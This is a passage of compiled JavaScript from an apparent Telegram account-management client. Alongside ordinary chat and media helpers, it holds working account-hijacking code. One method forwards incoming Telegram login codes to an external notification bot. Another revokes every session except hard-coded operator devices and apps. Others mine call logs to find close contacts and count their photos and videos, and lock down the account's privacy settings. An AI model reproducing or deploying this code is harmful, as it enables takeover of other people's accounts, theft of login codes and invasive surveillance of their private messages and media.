                        chatId: entity.id,
                        userId: me.id,
                        revokeHistory: false
                    }));
                    chatType = 'group';
                    left = true;
                }
                else {
                    this.logger.warn(this.phoneNumber, `Unknown entity type for ${id}, skipping`);
                    skipCount++;
                    continue;
                }
                if (left) {
                    this.logger.info(this.phoneNumber, `Left ${chatType}: ${id}`);
                    successCount++;
                }
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(3000);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${this.phoneNumber} Failed to leave chat ${id}:`, false);
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    this.logger.error(this.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);
                    skipCount++;
                    continue;
                }
                this.logger.warn(this.phoneNumber, `Error leaving ${id}:`, errorDetails.message);
                skipCount++;
            }
        }
        this.logger.info(this.phoneNumber, `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`);
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        this.logger.info(this.phoneNumber, "trying to join channel: ", `@${entity}`);
        return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];
        return authCriteria.some(criterion => {
            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';
            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {
                return true;
            }
            if ('values' in criterion) {
                return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
            }
            return fieldValue.includes(criterion.value.toLowerCase());
        });
    }
    async resetAuthorization(auth) {
        try {
            await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `Failed to reset authorization for ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
        }
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chatData = [];
        let total = 0;
        for await (const chat of this.client.iterDialogs({ limit: 500 })) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
            total++;
        }
        this.logger.info(this.phoneNumber, "TotalChats:", total);
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            this.logger.info(this.phoneNumber, "messageId image:", message.id);
            const photo = message.photo;
            const sizes = photo?.sizes || [];
            const preferredSize = sizes.find((s) => s.type === 'm') ||
                sizes.find((s) => s.type === 'x') ||
                sizes[sizes.length - 1] ||
                sizes[0];
            return await this.client.downloadMedia(message, {
                thumb: preferredSize || sizes[0]
            });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument &&
            (message.document?.mimeType?.startsWith('video') ||
                message.document?.mimeType?.startsWith('image'))) {
            this.logger.info(this.phoneNumber, "messageId video:", message.id);
            const thumbs = message.document?.thumbs || [];
            const preferredThumb = thumbs.find((t) => t.type === 'm') ||
                thumbs[thumbs.length - 1] ||
                thumbs[0];
            return await this.client.downloadMedia(message, {
                thumb: preferredThumb || thumbs[0]
            });
        }
        return null;
    }
    async getThumbnailBuffer(message) {
        try {
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const sizes = message.photo?.sizes || [];
                if (sizes.length > 0) {
                    const preferredSize = sizes.find((s) => s.type === 'm') ||
                        sizes.find((s) => s.type === 'x') ||
                        sizes[sizes.length - 1] ||
                        sizes[0];
                    return await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: preferredSize }), 30000);
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const thumbs = message.document?.thumbs || [];
                if (thumbs.length > 0) {
                    const preferredThumb = thumbs.find((t) => t.type === 'm') ||
                        thumbs[thumbs.length - 1] ||
                        thumbs[0];
                    return await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: preferredThumb }), 30000);
                }
            }
        }
        catch (error) {
            this.logger.warn(this.phoneNumber, `Failed to get thumbnail for message ${message.id}:`, error);
        }
        return null;
    }
    async getMessageWithMedia(messageId, chatId) {
        const entity = await this.safeGetEntity(chatId);
        const messages = await this.client.getMessages(entity, { ids: [messageId] });
        const message = messages[0];
        if (!message || message.media instanceof telegram_1.Api.MessageMediaEmpty) {
            throw new Error('Media not found');
        }
        return message;
    }
    getMediaFileInfo(message) {
        const media = message.media;
        let contentType;
        let filename;
        let fileLocation;
        let fileSize = 0;
        let inputLocation;
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            const photo = message.photo;
            if (!photo || photo instanceof telegram_1.Api.PhotoEmpty) {
                throw new Error('Photo not found in message');
            }
            inputLocation = photo;
            contentType = 'image/jpeg';
            filename = 'photo.jpg';
            const data = {
                id: photo.id,
                accessHash: photo.accessHash,
                fileReference: photo.fileReference,
            };
            fileLocation = new telegram_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
            const sizes = photo?.sizes || [];
            const largestSize = sizes[sizes.length - 1];
            if (largestSize && 'size' in largestSize) {
                fileSize = largestSize.size || 0;
            }
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (!document || document instanceof telegram_1.Api.DocumentEmpty) {
                throw new Error('Document not found in message');
            }
            if (!(document instanceof telegram_1.Api.Document)) {
                throw new Error('Document format not supported');
            }
            inputLocation = document;
            const fileNameAttr = document.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
            filename = fileNameAttr?.fileName || 'document.bin';
            contentType = document.mimeType || this.detectContentType(filename);
            fileSize = typeof document.size === 'number' ? document.size : (document.size ? Number(document.size.toString()) : 0);
            const data = {
                id: document.id,
                accessHash: document.accessHash,
                fileReference: document.fileReference,
            };
            fileLocation = new telegram_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
        }
        else {
            throw new Error('Unsupported media type');
        }
        return {
            contentType,
            filename,
            fileLocation,
            fileSize,
            inputLocation
        };
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new telegram_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog(limit = 1000) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const maxLimit = Math.min(Math.max(limit, 1), 10000);
            let analyzedCalls = 0;
            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                audio: 0,
                chatCallCounts: {},
                totalCalls: 0
            };
            const result = await this.client.invoke(new telegram_1.Api.messages.Search({
                peer: new telegram_1.Api.InputPeerEmpty(),
                q: '',
                filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: maxLimit,
                maxId: 0,
                minId: 0,
                hash: (0, big_integer_1.default)(0),
            }));
            const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
            const entityCache = new Map();
            for (const log of callLogs) {
                if (analyzedCalls >= maxLimit)
                    break;
                try {
                    if (!log.action || !(log.action instanceof telegram_1.Api.MessageActionPhoneCall)) {
                        continue;
                    }
                    filteredResults.totalCalls++;
                    analyzedCalls++;
                    const logAction = log.action;
                    if (log.out) {
                        filteredResults.outgoing++;
                    }
                    else {
                        filteredResults.incoming++;
                    }
                    if (logAction.video) {
                        filteredResults.video++;
                    }
                    else {
                        filteredResults.audio++;
                    }
                    let chatId;
                    let peerType = 'user';
                    if (log.peerId instanceof telegram_1.Api.PeerUser) {
                        chatId = log.peerId.userId.toString();
                        peerType = 'user';
                    }
                    else if (log.peerId instanceof telegram_1.Api.PeerChat) {
                        chatId = log.peerId.chatId.toString();
                        peerType = 'group';
                    }
                    else if (log.peerId instanceof telegram_1.Api.PeerChannel) {
                        chatId = log.peerId.channelId.toString();
                        peerType = 'channel';
                    }
                    else {
                        const peerTypeName = log.peerId?.className || 'Unknown';
                        this.logger.warn(this.phoneNumber, `Unknown peer type in call log: ${peerTypeName}`);
                        continue;
                    }
                    if (!filteredResults.chatCallCounts[chatId]) {
                        if (!entityCache.has(chatId)) {
                            try {
                                const entity = await this.safeGetEntity(chatId);
                                if (entity instanceof telegram_1.Api.User) {
                                    entityCache.set(chatId, {
                                        phone: entity.phone,
                                        username: entity.username,
                                        name: `${entity.firstName || ''} ${entity.lastName || ''}`.trim() || 'Unknown',
                                        peerType: 'user'
                                    });
                                }
                                else if (entity instanceof telegram_1.Api.Chat) {
                                    entityCache.set(chatId, {
                                        name: entity.title || 'Unknown Group',
                                        peerType: 'group'
                                    });
                                }
                                else if (entity instanceof telegram_1.Api.Channel) {
                                    entityCache.set(chatId, {
                                        username: entity.username,
                                        name: entity.title || 'Unknown Channel',
                                        peerType: 'channel'
                                    });
                                }
                                else {
                                    entityCache.set(chatId, {
                                        name: 'Unknown',
                                        peerType
                                    });
                                }
                            }
                            catch (entityError) {
                                this.logger.warn(this.phoneNumber, `Failed to get entity for chatId ${chatId}:`, entityError);
                                entityCache.set(chatId, {
                                    name: 'Unknown',
                                    peerType
                                });
                            }
                        }
                        const cachedEntity = entityCache.get(chatId);
                        filteredResults.chatCallCounts[chatId] = {
                            ...cachedEntity,
                            count: 0
                        };
                    }
                    filteredResults.chatCallCounts[chatId].count++;
                }
                catch (logError) {
                    this.logger.warn(this.phoneNumber, 'Error processing call log entry:', logError);
                }
            }
            const filteredChatCallCounts = [];
            for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
                if (details.count > 4) {
                    try {
                        let video = 0;
                        let photo = 0;
                        let totalMsgs = 0;
                        const maxMessagesToAnalyze = 600;
                        let messageCount = 0;
                        for await (const message of this.client.iterMessages(chatId, {
                            limit: maxMessagesToAnalyze,
                            reverse: false
                        })) {
                            messageCount++;
                            if (message.text) {
                                const text = message.text.toLowerCase();
                                if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                                    continue;
                                }
                            }
                            if (message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                                    photo++;
                                }
                                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                                    const document = message.media.document;
                                    if (document instanceof telegram_1.Api.Document) {
                                        const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                                        const isImage = document.mimeType?.startsWith('image/');
                                        if (isVideo) {
                                            video++;
                                        }
                                        else if (isImage) {
                                            photo++;
                                        }
                                    }
                                }
                            }
                        }
                        totalMsgs = messageCount;
                        filteredChatCallCounts.push({
                            chatId,
                            ...details,
                            msgs: totalMsgs,
                            video,
                            photo
                        });
                    }
                    catch (msgError) {
                        this.logger.warn(this.phoneNumber, `Failed to get messages for chatId ${chatId}:`, msgError);
                        filteredChatCallCounts.push({
                            chatId,
                            ...details
                        });
                    }
                }
            }
            filteredChatCallCounts.sort((a, b) => b.count - a.count);
            this.logger.info(this.phoneNumber, 'CallLog completed:', {
                totalCalls: filteredResults.totalCalls,
                analyzedCalls,
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCount: filteredChatCallCounts.length
            });
            return {
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCallCounts: filteredChatCallCounts,
                totalCalls: filteredResults.totalCalls,
                analyzedCalls
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getCallLog:', error);
            throw error;
        }
    }
    async getCallLogsInternal() {
        const finalResult = {};
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            finalResult[chatId] = filteredResults;
        }
        return finalResult;
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                this.logger.info(this.phoneNumber, event.message.text.toLowerCase());
                this.logger.info(this.phoneNumber, `Login Code received for - ${this.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
                this.logger.info(this.phoneNumber, "Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
            this.logger.info(this.phoneNumber, "Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                this.logger.info(this.phoneNumber, `You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        this.logger.info(this.phoneNumber, `Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        this.logger.info(this.phoneNumber, "Failed to download the photo.");
                    }
                }
                else {
                    this.logger.info(this.phoneNumber, `Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                this.logger.info(this.phoneNumber, "No profile photos found.");
            }
        }
        catch (err) {
            this.logger.error(this.phoneNumber, "Error:", err);
        }
    }
    async getLastActiveTime() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
            let latest = 0;
            result.authorizations.forEach((auth) => {
                if (!this.isAuthMine(auth)) {
                    if (auth.dateActive && latest < auth.dateActive) {
                        latest = auth.dateActive;
                    }
                }
            });
            if (latest === 0) {
                return new Date().toISOString().split('T')[0];
            }
            return new Date(latest * 1000).toISOString().split('T')[0];
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting last active time:', error);
            return new Date().toISOString().split('T')[0];
        }
    }
    async getContacts() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const exportedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({
                hash: (0, big_integer_1.default)(0)
            }));
            return exportedContacts;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting contacts:', error);
            throw error;
        }
    }
    async deleteChat(params) {
        try {
            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
            this.logger.info(this.phoneNumber, `Dialog with ID ${params.peer} has been deleted.`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new telegram_1.Api.contacts.Block({
                id: chatId,
            }));
            this.logger.info(this.phoneNumber, `User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to block user:', error);
        }
    }
    async getMediaMetadata(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);
        const query = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };
        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getMediaMetadata", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
        const filteredMessages = messages
            .filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return typesToFetch.includes(mediaType);
        })
            .map(message => {
            const mediaType = this.getMediaType(message.media);
            let fileSize;
            let mimeType;
            let filename;
            let width;
            let height;
            let duration;
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const photo = message.photo;
                mimeType = 'image/jpeg';
                filename = 'photo.jpg';
                if (photo?.sizes && photo.sizes.length > 0) {
                    const largestSize = photo.sizes[photo.sizes.length - 1];
                    if (largestSize && 'size' in largestSize) {
                        fileSize = largestSize.size;
                    }
                    if (largestSize && 'w' in largestSize) {
                        width = largestSize.w;
                    }
                    if (largestSize && 'h' in largestSize) {
                        height = largestSize.h;
                    }
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const doc = message.media.document;
                if (doc instanceof telegram_1.Api.Document) {
                    fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                    mimeType = doc.mimeType;
                    const fileNameAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    filename = fileNameAttr?.fileName;
                    const videoAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                    if (videoAttr) {
                        width = videoAttr.w;
                        height = videoAttr.h;
                        duration = videoAttr.duration;
                    }
                    const audioAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeAudio);
                    if (audioAttr && !duration) {
                        duration = audioAttr.duration;
                    }
                }
            }
            let dateValue;
            const msgDate = message.date;
            if (msgDate) {
                if (typeof msgDate === 'number') {
                    dateValue = msgDate;
                }
                else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                    const dateObj = msgDate;
                    dateValue = Math.floor(dateObj.getTime() / 1000);
                }
                else {
                    dateValue = Math.floor(Date.now() / 1000);
                }
            }
            else {
                dateValue = Math.floor(Date.now() / 1000);
            }
            return {
                messageId: message.id,
                chatId: chatId,
                type: mediaType,
                date: dateValue,
                caption: message.message || '',
                fileSize,
                mimeType,
                filename,
                width,
                height,
                duration,
                mediaDetails: undefined
            };
        });
        if (hasAll) {
            const grouped = filteredMessages.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;
                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });
            const totalItems = filteredMessages.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const overallLastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && filteredMessages.length > 0 ? overallFirstMessageId : undefined;
            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            const total = filteredMessages.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const lastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            const prevMaxId = maxId && filteredMessages.length > 0 ? firstMessageId : undefined;
            return {
                data: filteredMessages,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async getThumbnail(messageId, chatId = 'me') {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const thumbBuffer = await this.getThumbnailBuffer(message);
        if (!thumbBuffer) {
            throw new Error('Thumbnail not available for this media');
        }
        const etag = this.generateETag(messageId, chatId, `thumb-${messageId}`);
        return {
            buffer: thumbBuffer,
            etag,
            contentType: 'image/jpeg',
            filename: `thumbnail_${messageId}.jpg`
        };
    }
    async getMediaFileDownloadInfo(messageId, chatId = 'me') {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const fileInfo = this.getMediaFileInfo(message);
        const fileId = typeof fileInfo.inputLocation.id === 'object'
            ? fileInfo.inputLocation.id.toString()
            : fileInfo.inputLocation.id;
        const etag = this.generateETag(messageId, chatId, fileId);
        return {
            ...fileInfo,
            etag
        };
    }
    async *streamMediaFile(fileLocation, offset = (0, big_integer_1.default)(0), limit = 5 * 1024 * 1024, requestSize = 512 * 1024) {
        for await (const chunk of this.client.iterDownload({
            file: fileLocation,
            offset,
            limit,
            requestSize,
        })) {
            yield chunk;
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    async processWithConcurrencyLimit(items, processor, concurrencyLimit = this.THUMBNAIL_CONCURRENCY_LIMIT, batchDelay = this.THUMBNAIL_BATCH_DELAY_MS) {
        const results = [];
        const errors = [];
        for (let i = 0; i < items.length; i += concurrencyLimit) {
            const batch = items.slice(i, i + concurrencyLimit);
            const batchResults = await Promise.allSettled(batch.map(item => processor(item)));
            for (const result of batchResults) {
                if (result.status === 'fulfilled') {
                    results.push(result.value);
                }
                else {
                    errors.push(result.reason);
                }
            }
            if (i + concurrencyLimit < items.length && batchDelay > 0) {
                await new Promise(resolve => setTimeout(resolve, batchDelay));
            }
        }
        if (errors.length > 0) {
            this.logger.warn(this.phoneNumber, `Completed processing with ${errors.length} errors out of ${items.length} items`);
        }
        return results;
    }
    getMediaDetails(media) {
        if (!media?.document)
            return null;
        const doc = media.document;
        if (doc instanceof telegram_1.Api.DocumentEmpty)
            return null;
        const videoAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
        const fileNameAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }
    async downloadFileFromUrl(url, maxSize = this.MAX_FILE_SIZE) {
        try {
            const headResponse = await axios_1.default.head(url, {
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                validateStatus: (status) => status >= 200 && status < 400
            });
            const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);
            if (contentLength > maxSize) {
                throw new Error(`File size ${contentLength} exceeds maximum ${maxSize} bytes`);
            }
            const response = await axios_1.default.get(url, {
                responseType: 'arraybuffer',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: maxSize,
                validateStatus: (status) => status >= 200 && status < 300
            });
            const buffer = Buffer.from(response.data);
            if (buffer.length > maxSize) {
                throw new Error(`Downloaded file size ${buffer.length} exceeds maximum ${maxSize} bytes`);
            }
            return buffer;
        }
        catch (error) {
            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status} - ${error.response.statusText}`);
            }
            else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout after ${this.FILE_DOWNLOAD_TIMEOUT}ms`);
            }
            else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }
    detectContentType(filename, mimeType) {
        if (mimeType)
            return mimeType;
        const ext = filename.split('.').pop()?.toLowerCase() || '';
        const mimeMap = {
            'jpg': 'image/jpeg',
            'jpeg': 'image/jpeg',
            'png': 'image/png',
            'gif': 'image/gif',
            'webp': 'image/webp',
            'mp4': 'video/mp4',
            'webm': 'video/webm',
            'mov': 'video/quicktime',
            'avi': 'video/x-msvideo',
            'ogg': 'audio/ogg',
            'mp3': 'audio/mpeg',
            'wav': 'audio/wav',
            'pdf': 'application/pdf',
            'zip': 'application/zip',
            'doc': 'application/msword',
            'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        };
        return mimeMap[ext] || 'application/octet-stream';
    }
